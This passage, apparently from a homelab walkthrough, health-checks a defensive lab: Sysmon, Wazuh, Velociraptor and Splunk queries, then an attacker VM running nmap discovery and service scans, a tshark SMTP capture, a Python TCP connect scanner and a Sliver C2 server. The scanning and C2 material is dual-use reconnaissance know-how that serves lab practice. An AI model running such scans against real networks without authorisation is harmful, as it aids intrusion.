+<p>Next, I retrieve the network-connection records:</p>
+<pre><code class="language-powershell"># Retrieve the five newest Sysmon network-connection events with their complete messages.
+$NetworkEventFilter = @{LogName=&#39;Microsoft-Windows-Sysmon/Operational&#39;; Id=3}
+Get-WinEvent -FilterHashtable $NetworkEventFilter -MaxEvents 5 |
+    Select-Object TimeCreated, Message |
+    Format-List
+</code></pre>
+<pre><code class="language-plaintext">TimeCreated : 9/8/2026 10:22:06 AM
+Message     : Network connection detected:
+              RuleName: SSH
+              UtcTime: 2026-09-08 17:22:03.215
+              ProcessGuid: {337b76be-cd2d-6a9e-4400-000000001d00}
+              ProcessId: 3248
+              Image: C:\Windows\System32\OpenSSH\sshd.exe
+              User: NT AUTHORITY\SYSTEM
+              Protocol: tcp
+              Initiated: false
+              SourceIsIpv6: false
+              SourceIp: 10.10.10.10
+              SourceHostname: CORP
+              SourcePort: 63387
+              SourcePortName: -
+              DestinationIsIpv6: false
+              DestinationIp: 10.10.10.22
+              DestinationHostname: WS02.corp.local
+              DestinationPort: 22
+              DestinationPortName: ssh
+
+TimeCreated : 9/8/2026 10:21:34 AM
+Message     : Network connection detected:
+              RuleName: SSH
+              UtcTime: 2026-09-08 17:21:31.351
+              ProcessGuid: {337b76be-cd2d-6a9e-4400-000000001d00}
+              ProcessId: 3248
+              Image: C:\Windows\System32\OpenSSH\sshd.exe
+              User: NT AUTHORITY\SYSTEM
+              Protocol: tcp
+              Initiated: false
+              SourceIsIpv6: false
+              SourceIp: 10.10.10.10
+              SourceHostname: CORP
+              SourcePort: 55164
+              SourcePortName: -
+              DestinationIsIpv6: false
+              DestinationIp: 10.10.10.22
+              DestinationHostname: WS02.corp.local
+              DestinationPort: 22
+              DestinationPortName: ssh
+
+TimeCreated : 9/8/2026 10:18:06 AM
+Message     : Network connection detected:
+              RuleName: SSH
+              UtcTime: 2026-09-08 17:18:02.799
+              ProcessGuid: {337b76be-cd2d-6a9e-4400-000000001d00}
+              ProcessId: 3248
+              Image: C:\Windows\System32\OpenSSH\sshd.exe
+              User: NT AUTHORITY\SYSTEM
+              Protocol: tcp
+              Initiated: false
+              SourceIsIpv6: false
+              SourceIp: 10.10.10.10
+              SourceHostname: CORP
+              SourcePort: 59461
+              SourcePortName: -
+              DestinationIsIpv6: false
+              DestinationIp: 10.10.10.22
+              DestinationHostname: WS02.corp.local
+              DestinationPort: 22
+              DestinationPortName: ssh
+
+TimeCreated : 9/8/2026 10:17:09 AM
+Message     : Network connection detected:
+              RuleName: SSH
+              UtcTime: 2026-09-08 17:17:05.282
+              ProcessGuid: {337b76be-cd2d-6a9e-4400-000000001d00}
+              ProcessId: 3248
+              Image: C:\Windows\System32\OpenSSH\sshd.exe
+              User: NT AUTHORITY\SYSTEM
+              Protocol: tcp
+              Initiated: false
+              SourceIsIpv6: false
+              SourceIp: 10.10.10.10
+              SourceHostname: CORP
+              SourcePort: 52177
+              SourcePortName: -
+              DestinationIsIpv6: false
+              DestinationIp: 10.10.10.22
+              DestinationHostname: WS02.corp.local
+              DestinationPort: 22
+              DestinationPortName: ssh
+
+TimeCreated : 9/8/2026 8:56:17 AM
+Message     : Network connection detected:
+              RuleName: SSH
+              UtcTime: 2026-09-08 15:56:14.377
+              ProcessGuid: {337b76be-cd2d-6a9e-4400-000000001d00}
+              ProcessId: 3248
+              Image: C:\Windows\System32\OpenSSH\sshd.exe
+              User: NT AUTHORITY\SYSTEM
+              Protocol: tcp
+              Initiated: false
+              SourceIsIpv6: false
+              SourceIp: 10.10.10.30
+              SourceHostname: -
+              SourcePort: 53480
+              SourcePortName: -
+              DestinationIsIpv6: false
+              DestinationIp: 10.10.10.22
+              DestinationHostname: WS02.corp.local
+              DestinationPort: 22
+              DestinationPortName: ssh
+</code></pre>
+<h3>Network configuration and agents</h3>
+<p>Confirm that WS02 uses DC01 as its primary DNS server:</p>
+<pre><code class="language-powershell"># Show the IPv4 DNS servers assigned to each network interface.
+Get-DnsClientServerAddress -AddressFamily &#39;IPv4&#39; |
+    Select-Object InterfaceAlias, ServerAddresses
+</code></pre>
+<pre><code class="language-plaintext">InterfaceAlias              ServerAddresses
+--------------              ---------------
+Ethernet1                   {10.10.10.11}
+Loopback Pseudo-Interface 1 {}
+</code></pre>
+<p>Finally, I check the defensive services:</p>
+<pre><code class="language-powershell"># Confirm that the Wazuh and Velociraptor endpoint agents are running automatically.
+Get-Service -Name @(&#39;WazuhSvc&#39;, &#39;Velociraptor&#39;) |
+    Select-Object Name, Status, StartType
+</code></pre>
+<pre><code class="language-plaintext">Name          Status StartType
+----          ------ ---------
+Velociraptor Running Automatic
+WazuhSvc     Running Automatic
+</code></pre>
+<hr>
+<p>Both endpoints are producing local evidence and their collection agents are running. The next step is to prove that the central detection systems receive and expose that evidence.</p>
+<h2>SIEM01</h2>
+<h3>Platform health</h3>
+<p>The walkthrough now moves to the defensive layer. SIEM01 hosts Wazuh, Velociraptor, and a Splunk forwarder. It&#39;s the busiest single point of failure in the estate.</p>
+<pre><code class="language-bash"># Print the Linux host, operating-system, kernel, and virtualization identity.
+hostnamectl
+</code></pre>
+<pre><code class="language-plaintext">Static hostname: siem01
+Icon name: computer-vm
+Chassis: vm 🖴
+Chassis Asset Tag: No Asset Tag
+Machine ID: 2a10102d1856420c8adb8d7ab33321f3
+Boot ID: f2efc935409e4142b9a2dff7a239ebe4
+AF_VSOCK CID: 2868040584
+Virtualization: vmware
+Operating System: Ubuntu 26.04 LTS
+Kernel: Linux 7.0.0-30-generic
+Architecture: x86-64
+Hardware Vendor: VMware, Inc.
+Hardware Model: VMware Virtual Platform
+Hardware Version: None
+Firmware Version: 6.00
+Firmware Date: Tue 2026-02-17
+Firmware Age: 6month 3w
+</code></pre>
+<p>With the host identity recorded, I check whether the Wazuh components are running:</p>
+<pre><code class="language-bash"># Return one active/inactive state for each core Wazuh component.
+systemctl is-active wazuh-manager wazuh-indexer wazuh-dashboard filebeat
+</code></pre>
+<pre><code class="language-plaintext">active
+active
+active
+active
+</code></pre>
+<h3>Wazuh telemetry</h3>
+<p>Which agents are active?</p>
+<pre><code class="language-bash"># List the Wazuh manager&#39;s enrolled agents and their current connection states.
+sudo /var/ossec/bin/agent_control -l
+</code></pre>
+<pre><code class="language-plaintext">Wazuh agent_control. List of available agents:
+ID: 000, Name: siem01 (server), IP: 127.0.0.1, Active/Local
+ID: 001, Name: DC01, IP: any, Active
+ID: 002, Name: WS01, IP: any, Active
+ID: 003, Name: SRV01, IP: any, Active
+ID: 004, Name: WS02, IP: any, Active
+ID: 005, Name: siem02, IP: any, Active
+</code></pre>
+<p>In the Wazuh dashboard, I check WS01&#39;s latest process-creation events:</p>
+<pre><code class="language-plaintext">agent.name:WS01 and data.win.system.eventID:1
+</code></pre>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/02-WS01-ProcessCreate.png" alt="WS01 process-creation telemetry in Wazuh." width="1912" height="904" loading="lazy">
+<figcaption><span class="lab">Fig 3.</span> WS01 process-creation telemetry in Wazuh.</figcaption>
+</figure>
+
+
+<p>I then filter for all Sysmon events from SRV01:</p>
+<pre><code class="language-plaintext">rule.groups:sysmon and agent.name:SRV01
+</code></pre>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/04-SRV01-Sysmon.png" alt="SRV01 Sysmon telemetry in Wazuh." width="1908" height="898" loading="lazy">
+<figcaption><span class="lab">Fig 4.</span> SRV01 Sysmon telemetry in Wazuh.</figcaption>
+</figure>
+
+
+<p>I also query the raw Wazuh alert file for the five most recent records:</p>
+<pre><code class="language-bash"># Read the five newest Wazuh JSON alerts and reduce each record to four investigation fields.
+sudo tail -n 5 /var/ossec/logs/alerts/alerts.json |
+  jq -c &#39;{ts:.timestamp, agent:.agent.name, rule:.rule.id, desc:.rule.description}&#39;
+</code></pre>
+<pre><code class="language-plaintext">{&quot;ts&quot;:&quot;2026-09-08T23:47:51.012-0700&quot;,&quot;agent&quot;:&quot;siem01&quot;,&quot;rule&quot;:&quot;52000&quot;,&quot;desc&quot;:&quot;Apparmor messages grouped.&quot;}
+{&quot;ts&quot;:&quot;2026-09-08T23:47:59.015-0700&quot;,&quot;agent&quot;:&quot;siem01&quot;,&quot;rule&quot;:&quot;52000&quot;,&quot;desc&quot;:&quot;Apparmor messages grouped.&quot;}
+{&quot;ts&quot;:&quot;2026-09-08T23:48:01.015-0700&quot;,&quot;agent&quot;:&quot;siem01&quot;,&quot;rule&quot;:&quot;52000&quot;,&quot;desc&quot;:&quot;Apparmor messages grouped.&quot;}
+{&quot;ts&quot;:&quot;2026-09-08T23:48:09.018-0700&quot;,&quot;agent&quot;:&quot;siem01&quot;,&quot;rule&quot;:&quot;52000&quot;,&quot;desc&quot;:&quot;Apparmor messages grouped.&quot;}
+{&quot;ts&quot;:&quot;2026-09-08T23:48:09.509-0700&quot;,&quot;agent&quot;:&quot;DC01&quot;,&quot;rule&quot;:&quot;60137&quot;,&quot;desc&quot;:&quot;Windows User Logoff&quot;}
+</code></pre>
+<h3>Velociraptor listeners</h3>
+<p>I confirm that the Velociraptor frontend and GUI are listening, then use the dashboard to view the processes currently active on WS01:</p>
+<pre><code class="language-bash"># List TCP listeners and retain the Velociraptor frontend and GUI ports.
+ss -lntp | grep -E &#39;:8000|:8889&#39;
+</code></pre>
+<pre><code class="language-plaintext">LISTEN 0      4096                    *:8000             *:*
+LISTEN 0      4096                    *:8889             *:*
+</code></pre>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/05-WS01-Velociraptor.png" alt="WS01 in Velociraptor." width="1904" height="902" loading="lazy">
+<figcaption><span class="lab">Fig 5.</span> WS01 in Velociraptor.</figcaption>
+</figure>
+
+
+<p>This Python script reads the alert file line by line, keeps alerts whose rule ID falls in the custom RMM range, and prints the newest match as clean JSON. I will reuse it during the later RMM exercise:</p>
+<h3>Latest RMM alert</h3>
+<pre><code class="language-python"># Parse one JSON object per Wazuh alert line.
+import json
+# Represent the alert log as a filesystem path.
+import pathlib
+
+# Point to Wazuh&#39;s newline-delimited alert store.
+alerts = pathlib.Path(&quot;/var/ossec/logs/alerts/alerts.json&quot;)
+# Retain the newest matching record encountered during the forward scan.
+latest_match = None
+
+# Stream the file so large alert histories do not have to be loaded into memory.
+with alerts.open(&quot;r&quot;, encoding=&quot;utf-8&quot;, errors=&quot;replace&quot;) as alert_stream:
+    # Examine each newline-delimited JSON record in chronological file order.
+    for line in alert_stream:
+        try:
+            # Decode the current alert.
+            alert = json.loads(line)
+        except json.JSONDecodeError:
+            # Skip a malformed or partially written line without hiding other errors.
+            continue
+        # Read the rule identifier defensively because not every record has the same shape.
+        rule_id = str(alert.get(&quot;rule&quot;, {}).get(&quot;id&quot;, &quot;&quot;))
+        # Keep alerts in the lab&#39;s reserved RMM rule range.
+        if rule_id.isdigit() and 100210 &lt;= int(rule_id) &lt;= 100259:
+            latest_match = alert
+
+# Print the newest matching alert in a compact evidence-oriented shape.
+if latest_match is not None:
+    # Reach the Windows event-data object without assuming every intermediate key exists.
+    event_data = latest_match.get(&quot;data&quot;, {}).get(&quot;win&quot;, {}).get(&quot;eventdata&quot;, {})
+    # Select the fields needed to identify and investigate the alert.
+    summary = {
+        &quot;ts&quot;: latest_match.get(&quot;timestamp&quot;),
+        &quot;agent&quot;: latest_match.get(&quot;agent&quot;, {}).get(&quot;name&quot;),
+        &quot;rule&quot;: latest_match.get(&quot;rule&quot;, {}).get(&quot;id&quot;),
+        &quot;desc&quot;: latest_match.get(&quot;rule&quot;, {}).get(&quot;description&quot;),
+        &quot;image&quot;: event_data.get(&quot;image&quot;),
+    }
+    # Render the selected fields as readable JSON.
+    print(json.dumps(summary, indent=2))
+else:
+    # Explain how to generate a record when the range has not appeared yet.
+    print(&quot;no RMM-range (100210-100259) alert found yet; run the capstone detonation first&quot;)
+</code></pre>
+<pre><code class="language-plaintext">no RMM-range (100210-100259) alert found yet; run the capstone detonation first
+</code></pre>
+<hr>
+<p>Wazuh and Velociraptor confirm collection at SIEM01. SIEM02 provides the second analytics view and makes it possible to compare current Wazuh state with indexed history.</p>
+<h2>SIEM02</h2>
+<h3>Platform and receiver health</h3>
+<p>Wazuh shows whether a rule matched in current telemetry. The Splunk instance supports longer-term aggregation and risk analysis across many alerts. Splunk runs through its non-root <code>splunk</code> service account, so the status command is wrapped in <code>runuser</code>. The <code>splunkd is running</code> message and helper-process IDs establish the base service state.</p>
+<pre><code class="language-bash"># Print SIEM02&#39;s operating-system, kernel, and virtualization identity.
+hostnamectl
+
+# Ask Splunk to report its daemon and helper-process status as the service account.
+sudo runuser -u splunk -- /opt/splunk/bin/splunk status
+</code></pre>
+<pre><code class="language-plaintext">Static hostname: siem02
+Icon name: computer-vm
+Chassis: vm 🖴
+Chassis Asset Tag: No Asset Tag
+Machine ID: c56c2233934c4988b1243a3db53dbe32
+Boot ID: 30ac29c61e004faba9d0d605379de52c
+Product UUID: fcf64d56-61e3-e403-0267-48b069fd36e6
+AF_VSOCK CID: 1778202342
+Virtualization: vmware
+Operating System: Ubuntu 26.04 LTS
+Kernel: Linux 7.0.0-30-generic
+Architecture: x86-64
+Hardware Vendor: VMware, Inc.
+Hardware Model: VMware Virtual Platform
+Hardware Serial: VMware-56 4d f6 fc e3 61 03 e4-02 67 48 b0 69 fd 36 e6
+Hardware Version: None
+Firmware Version: 6.00
+Firmware Date: Tue 2026-02-17
+Firmware Age: 6month 3w
+
+
+splunkd is running (PID: 442607).
+splunk helpers are running (PIDs: 442776 443164 443168 443289 443300 452340).
+</code></pre>
+<p>Port 9997 is Splunk&#39;s receiving port, where SIEM01&#39;s forwarder sends.</p>
+<pre><code class="language-bash"># Confirm that Splunk is listening for forwarder traffic on TCP 9997.
+ss -lntp | grep &#39;:9997&#39;
+</code></pre>
+<pre><code class="language-plaintext">LISTEN 0      128          0.0.0.0:9997       0.0.0.0:*    users:((&quot;splunkd&quot;,pid=442607,fd=70))
+</code></pre>
+<h3>Splunk searches</h3>
+<p>In the Splunk dashboard, I view a per-endpoint count of alerts indexed in the last day and when each was last seen:</p>
+<pre><code class="language-spl">index=wazuh-alerts earliest=-24h
+| stats count, latest(_time) as last by agent.name
+| eval last=strftime(last,&quot;%F %T&quot;)
+| sort -count
+</code></pre>
+<p>Here, the first line limits the data to the Wazuh index and the last 24 hours. <code>stats</code> groups the count and newest timestamp by agent, <code>eval</code> formats that timestamp, and <code>sort</code> places the noisiest agent first.</p>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/06-Splunk.png" alt="Per-endpoint alert counts and last-seen timestamps in Splunk." width="1910" height="522" loading="lazy">
+<figcaption><span class="lab">Fig 6.</span> Per-endpoint alert counts and last-seen timestamps in Splunk.</figcaption>
+</figure>
+
+
+<p>I then chart the same data as a time series to show when each host was noisy. <code>timechart span=1h</code> creates one-hour buckets.</p>
+<pre><code class="language-spl">index=wazuh-alerts earliest=-24h
+| timechart span=1h count by agent.name
+</code></pre>
+<p>The first line selects the same 24-hour Wazuh window. <code>timechart</code> then creates one-hour buckets and a separate count series for each agent.</p>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/07-Splunk-Hourly.png" alt="Hourly Wazuh alert counts by agent in Splunk." width="1914" height="906" loading="lazy">
+<figcaption><span class="lab">Fig 7.</span> Hourly Wazuh alert counts by agent in Splunk.</figcaption>
+</figure>
+
+
+<h3>CLI verification</h3>
+<p>Finally, I query Splunk directly from the CLI:</p>
+<pre><code class="language-bash"># Read the Splunk administrator password without echoing it to the terminal.
+read -rsp &#39;Splunk admin password: &#39; SPLUNK_PASSWORD
+# Move the prompt to a clean line after the hidden input.
+echo
+
+# Search the complete Wazuh index and suppress Splunk&#39;s changing preview rows.
+sudo runuser -u splunk -- /opt/splunk/bin/splunk search \
+  &#39;index=wazuh-alerts earliest=0 latest=now | stats count by agent.name | sort agent.name&#39; \
+  -preview false \
+  -auth &quot;admin:$SPLUNK_PASSWORD&quot;
+
+# Remove the plaintext password from the current shell environment.
+unset SPLUNK_PASSWORD
+</code></pre>
+<pre><code class="language-plaintext">WARNING: Server Certificate Hostname Validation is disabled. Please see server.conf/[sslConfig]/cliVerifyServerName for details.
+agent.name count
+---------- ------
+DC01        97729
+SRV01       11560
+WS01         5935
+WS02         9274
+siem01     394291
+siem02       4925
+</code></pre>
+<p>This recorded search returned 523,714 alerts across all indexed time. The volume shows that the lab needs tuning, but the count alone does not identify false positives; rule-level review is still required. Because this is a captured result, later runs will return a higher total and a later time boundary.</p>
+<hr>
+<p>The monitoring path is now accounted for from endpoint to index. The final section changes perspective and validates what the isolated attacker VM can discover and generate on the same lab network.</p>
+<h2>KALI</h2>
+<h3>Host and tool inventory</h3>
+<p>Every other machine is something to protect and monitor; this is the one I attack from. What defines it is the offensive toolset and the absence of any agent.</p>
+<pre><code class="language-bash"># Print Kali&#39;s host and operating-system identity.
+hostnamectl
+# Show only the interface that owns an address on the isolated lab subnet.
+ip -br address | grep &#39;10.10.10&#39;
+</code></pre>
+<pre><code class="language-plaintext">Static hostname: kali
+Icon name: computer-vm
+Chassis: vm 💽
+Chassis Asset Tag: No Asset Tag
+Machine ID: 1af5c524979847eb81886e393532ddb7
+Boot ID: e085988c00474e63994a6b7d2c6059f1
+Product UUID: 79f84d56-98fa-e417-cd1f-fe86c88d5a53
+AF_VSOCK CID: 1422055970
+Virtualization: vmware
+Operating System: Kali GNU/Linux Rolling
+Kernel: Linux 7.0.12+kali-amd64
+Architecture: x86-64
+Hardware Vendor: VMware, Inc.
+Hardware Model: VMware Virtual Platform
+Hardware Serial: VMware-56 4d f8 79 fa 98 17 e4-cd 1f fe 86 c8 8d 5a 53
+Hardware Version: None
+Firmware Version: 6.00
+Firmware Date: Tue 2026-02-17
+Firmware Age: 6month 3w
+
+
+eth1             UP             10.10.10.30/24 fe80::7082:a334:9c2:d6fc/64
+</code></pre>
+<p>Confirm that the most frequently used offensive tools are installed:</p>
+<pre><code class="language-bash"># Resolve each named tool to its executable path and discard missing-tool diagnostics.
+command -v nmap tshark impacket-GetUserSPNs nxc hashcat responder msfconsole 2&gt;/dev/null
+</code></pre>
+<pre><code class="language-plaintext">/usr/bin/nmap
+/usr/bin/tshark
+/usr/bin/impacket-GetUserSPNs
+/usr/bin/nxc
+/usr/bin/hashcat
+/usr/sbin/responder
+/usr/bin/msfconsole
+</code></pre>
+<h3>Network discovery</h3>
+<p>A quick <code>nmap</code> scan of the whole estate:</p>
+<pre><code class="language-bash"># Discover live hosts without running a port scan, then display only hosts marked up.
+nmap -sn 10.10.10.0/24 -oG - | grep &#39;Up&#39;
+</code></pre>
+<pre><code class="language-plaintext">Host: 10.10.10.5 ()     Status: Up
+Host: 10.10.10.6 ()     Status: Up
+Host: 10.10.10.10 ()    Status: Up
+Host: 10.10.10.11 ()    Status: Up
+Host: 10.10.10.12 ()    Status: Up
+Host: 10.10.10.20 ()    Status: Up
+Host: 10.10.10.21 ()    Status: Up
+Host: 10.10.10.22 ()    Status: Up
+Host: 10.10.10.31 ()    Status: Up
+Host: 10.10.10.40 ()    Status: Up
+Host: 10.10.10.30 ()    Status: Up
+</code></pre>
+<p>Next, I run a targeted service-version scan against DC01 and SRV01:</p>
+<pre><code class="language-bash"># Create the persistent evidence directory if it does not exist.
+mkdir -p &#39;/mnt/external/01 Scripts/02 Health Checks/Linux&#39;
+# Probe the selected DC01 and SRV01 service ports and save normal-format output.
+sudo nmap -sV -p 8080,3306,25,110,143,445,88,389 10.10.10.12 10.10.10.11 \
+  -oN &#39;/mnt/external/01 Scripts/02 Health Checks/Linux/Estate-Service-Scan.txt&#39;
+</code></pre>
+<pre><code class="language-plaintext">Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 00:26 -0700
+
+Nmap scan report for 10.10.10.12
+Host is up (0.0011s latency).
+
+PORT     STATE    SERVICE       VERSION
+25/tcp   open     smtp          hMailServer smtpd
+88/tcp   filtered kerberos-sec
+110/tcp  open     pop3          hMailServer pop3d
+143/tcp  open     imap          hMailServer imapd
+389/tcp  filtered ldap
+445/tcp  open     microsoft-ds?
+3306/tcp filtered mysql
+8080/tcp open     http          Microsoft IIS httpd 10.0
+MAC Address: 00:0C:29:83:C8:18 (VMware)
+Service Info: Host: SRV01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+Nmap scan report for 10.10.10.11
+Host is up (0.00100s latency).
+
+PORT     STATE    SERVICE       VERSION
+25/tcp   filtered smtp
+88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-09 07:26:45Z)
+110/tcp  filtered pop3
+143/tcp  filtered imap
+389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: corp.local, Site: Default-First-Site-Name)
+445/tcp  open     microsoft-ds?
+3306/tcp filtered mysql
+8080/tcp filtered http-proxy
+MAC Address: 00:0C:29:EB:DB:DC (VMware)
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 2 IP addresses (2 hosts up) scanned in 15.77 seconds
+</code></pre>
+<h3>SMTP packet capture</h3>
+<p>The service scan establishes the exposed surface. I now capture one controlled application exchange so the network evidence can be compared with server-side delivery evidence.</p>
+<p>Now for an SMTP packet capture test. In one terminal, run <code>tshark</code> for 60 seconds over port 25:</p>
+<pre><code class="language-bash"># Create the persistent capture directory if it does not exist.
+mkdir -p &#39;/mnt/external/01 Scripts/02 Health Checks/Linux&#39;
+# Capture only SMTP traffic involving SRV01 on Kali&#39;s lab-facing interface for up to 60 seconds.
+sudo timeout 60 tshark \
+  -i eth1 \
+  -f &quot;host 10.10.10.12 and port 25&quot; \
+  -w &quot;/mnt/external/01 Scripts/02 Health Checks/Linux/SMTP-Capture-$(date +%Y%m%d-%H%M%S).pcap&quot;
+</code></pre>
+<p>While the capture is running, execute this sender on Kali. The resulting plaintext SMTP session exposes the envelope commands (<code>MAIL FROM</code> and <code>RCPT TO</code>), message headers, and body. This specific test does not authenticate, so it does not produce an <code>AUTH</code> command:</p>
+<pre><code class="language-python"># Import Python&#39;s SMTP client.
+import smtplib
+# Import the standard MIME message builder.
+from email.message import EmailMessage
+
+# Create an empty message container.
+message = EmailMessage()
+# Set a controlled sender address for the lab exercise.
+message[&quot;From&quot;] = &quot;walkthrough@corp.local&quot;
+# Address the message to an existing FakeCorp mailbox.
+message[&quot;To&quot;] = &quot;pvance@fakecorp.local&quot;
+# Label the message so it is easy to identify in the capture.
+message[&quot;Subject&quot;] = &quot;[LAB] SMTP packet-capture test&quot;
+# Add a harmless body whose plaintext should appear in the PCAP.
+message.set_content(&quot;This message should be visible inside the authorized lab PCAP.&quot;)
+
+# Connect to SRV01&#39;s plaintext SMTP listener from Kali.
+with smtplib.SMTP(&quot;10.10.10.12&quot;, 25, timeout=10) as smtp:
+    # Submit the complete message; no AUTH command is used in this test.
+    smtp.send_message(message)
+
+# Confirm that the SMTP server accepted the submission.
+print(&quot;Message accepted by SRV01.&quot;)
+</code></pre>
+<p>Identify the newest capture and inspect its SMTP packets:</p>
+<pre><code class="language-bash"># Select the most recently written SMTP capture.
+PCAP=$(ls -1t &#39;/mnt/external/01 Scripts/02 Health Checks/Linux&#39;/SMTP-Capture-*.pcap | head -n 1)
+# Decode only SMTP packets from that capture.
+tshark -r &quot;$PCAP&quot; -Y smtp
+</code></pre>
+<pre><code class="language-plaintext">4 0.003415430  10.10.10.12 → 10.10.10.30  SMTP 83 S: 220 SRV01 ESMTP
+
+6 0.003903709  10.10.10.30 → 10.10.10.12  SMTP 84 C: ehlo [127.0.1.1]
+
+7 0.005150555  10.10.10.12 → 10.10.10.30  SMTP 122 S: 250-SRV01 | SIZE 20480000 | AUTH LOGIN | HELP
+
+8 0.005743138  10.10.10.30 → 10.10.10.12  SMTP 111 C: mail from:&lt;walkthrough@corp.local&gt; size=259
+
+9 0.009171021  10.10.10.12 → 10.10.10.30  SMTP 74 S: 250 OK
+
+10 0.009372274  10.10.10.30 → 10.10.10.12  SMTP 99 C: rcpt to:&lt;pvance@fakecorp.local&gt;
+
+11 0.013678800  10.10.10.12 → 10.10.10.30  SMTP 74 S: 250 OK
+
+12 0.013806087  10.10.10.30 → 10.10.10.12  SMTP 72 C: data
+
+13 0.015407542  10.10.10.12 → 10.10.10.30  SMTP 81 S: 354 OK, send.
+
+14 0.015580522  10.10.10.30 → 10.10.10.12  SMTP/IMF 328 from: walkthrough@corp.local, subject: [LAB] SMTP packet-capture test,  (text/plain) | .
+
+16 1.040665741  10.10.10.12 → 10.10.10.30  SMTP 94 S: 250 Queued (1.024 seconds)
+
+17 1.040889449  10.10.10.30 → 10.10.10.12  SMTP 72 C: QUIT
+
+18 1.041830097  10.10.10.12 → 10.10.10.30  SMTP 79 S: 221 goodbye
+</code></pre>
+<h3>Minimal TCP scanner</h3>
+<p>The packet capture shows one protocol in detail. This final script reduces service discovery to its basic operation and preserves the result beside the other Kali health-check evidence.</p>
+<p>Now for a TCP connect scanner that shows the core operation behind <code>nmap -sT</code>: attempt a TCP handshake on each selected port and record which connections succeed.</p>
+<pre><code class="language-python"># Import the socket API used to attempt TCP connections.
+import socket
+# Import pathlib so the result can be stored on persistent media.
+import pathlib
+
+# Select the application server to scan.
+target = &quot;10.10.10.12&quot;
+# Limit the scan to the lab&#39;s expected service ports.
+ports = [22, 25, 80, 110, 143, 445, 3306, 8080]
+# Collect ports that complete the TCP connection attempt.
+open_ports = []
+
+# Test each selected port in sequence.
+for port in ports:
+    # Create a new IPv4 TCP socket for this attempt.
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # Limit the wait for filtered or unreachable ports.
+    sock.settimeout(0.7)
+    try:
+        # A zero result means the TCP three-way handshake completed.
+        if sock.connect_ex((target, port)) == 0:
+            open_ports.append(port)
+    finally:
+        # Release the socket after every attempt.
+        sock.close()
+
+# Format one reusable evidence line.
+result = f&quot;{target} open: {open_ports}&quot;
+# Display the result for immediate review.
+print(result)
+# Keep the result beside the other persistent Kali health-check evidence.
+output = pathlib.Path(&quot;/mnt/external/01 Scripts/02 Health Checks/Linux/Python-TCP-Scan.txt&quot;)
+# Create the output directory if it does not already exist.
+output.parent.mkdir(parents=True, exist_ok=True)
+# Write the evidence as UTF-8 text.
+output.write_text(result + &quot;\n&quot;, encoding=&quot;utf-8&quot;)
+</code></pre>
+<pre><code class="language-plaintext">10.10.10.12 open: [22, 25, 80, 110, 143, 445, 8080]
+</code></pre>
+<hr>
+<h2>C2-01</h2>
+<p>The lab&#39;s most recent addition is another Ubuntu server that hosts Sliver, which is an open source cross-platform adversary emulation/red team framework. </p>
+<pre><code class="language-bash">hostnamectl
+ip -brief address
+ip route
+timedatectl
+df -h /
+findmnt /mnt/external
+</code></pre>
+<pre><code>Static hostname: c2-01
+Icon name: computer-vm
+Chassis: vm 🖴
+Chassis Asset Tag: No Asset Tag
+Machine ID: 7c3d49b10bde45b189707d11c5148ff1
+Boot ID: d333f0587a0145f9952fea5a06d7e79f
+AF_VSOCK CID: 714559368
+Virtualization: vmware
+Operating System: Ubuntu 26.04 LTS
+Kernel: Linux 7.0.0-31-generic
+Architecture: x86-64
+Hardware Vendor: VMware, Inc.
+Hardware Model: VMware Virtual Platform
+Hardware Version: None
+Firmware Version: 6.00
+Firmware Date: Tue 2026-02-17
+Firmware Age: 6month 3w
+lo               UNKNOWN        127.0.0.1/8 ::1/128
+ens33            UP             192.168.81.130/24 metric 100 fe80::20c:29ff:fe97:4f88/64
+ens37            UP             10.10.10.31/24 fe80::20c:29ff:fe97:4f92/64
+default via 192.168.81.2 dev ens33 proto dhcp src 192.168.81.130 metric 100
+10.10.10.0/24 dev ens37 proto kernel scope link src 10.10.10.31
+192.168.81.0/24 dev ens33 proto kernel scope link src 192.168.81.130 metric 100
+192.168.81.2 dev ens33 proto dhcp scope link src 192.168.81.130 metric 100
+Local time: Wed 2026-09-09 08:41:41 UTC
+Universal time: Wed 2026-09-09 08:41:41 UTC
+RTC time: Wed 2026-09-09 08:41:41
+Time zone: Etc/UTC (UTC, +0000)
+System clock synchronized: yes
+NTP service: active
+RTC in local TZ: no
+Filesystem                         Size  Used Avail Use% Mounted on
+/dev/mapper/ubuntu--vg-ubuntu--lv   19G  8.6G  9.1G  49% /
+TARGET SOURCE  FSTYPE OPTIONS
+/mnt/external
+//10.10.10.10/External
+cifs   rw,relatime,vers=3.1.1,cache=strict,upcall_target=app,username
+</code></pre>
+<pre><code class="language-bash">systemctl is-active sliver
+systemctl status sliver --no-pager
+sudo ss -lntp | grep -E &#39;(:31337|:443)&#39;
+</code></pre>
+<pre><code class="language-plaintext">active
+● sliver.service - Sliver C2 Server
+Loaded: loaded (/etc/systemd/system/sliver.service; enabled; preset: enabled)
+Active: active (running) since Wed 2026-09-09 06:31:07 UTC; 2h 11min ago
+Invocation: c75b1443ca324bdda3d3d76da76143ed
+Main PID: 1208 (sliver-server)
+Tasks: 7 (limit: 3936)
+Memory: 163.1M (peak: 168.6M)
+CPU: 1.190s
+CGroup: /system.slice/sliver.service
+└─1208 /usr/local/bin/sliver-server daemon --lhost 10.10.10.31 --lport…
+
+Sep 09 06:31:07 c2-01 systemd[1]: Started sliver.service - Sliver C2 Server.
+
+
+LISTEN 0      4096     10.10.10.31:31337      0.0.0.0:*    users:((&quot;sliver-server&quot;,pid=1208,fd=15))
+
+LISTEN 0      4096               *:443              *:*    users:((&quot;sliver-server&quot;,pid=1208,fd=13))
+</code></pre>
+<p>I&#39;m still in the process of learning how Sliver works. Its purpose is to provide more realism for the future adversary emulation labs.</p>
+<hr>
+<h2>LabWatch</h2>
+<p>I have a front-end incident management portal which automatically ingests high severity alerts:</p>
+<figure>
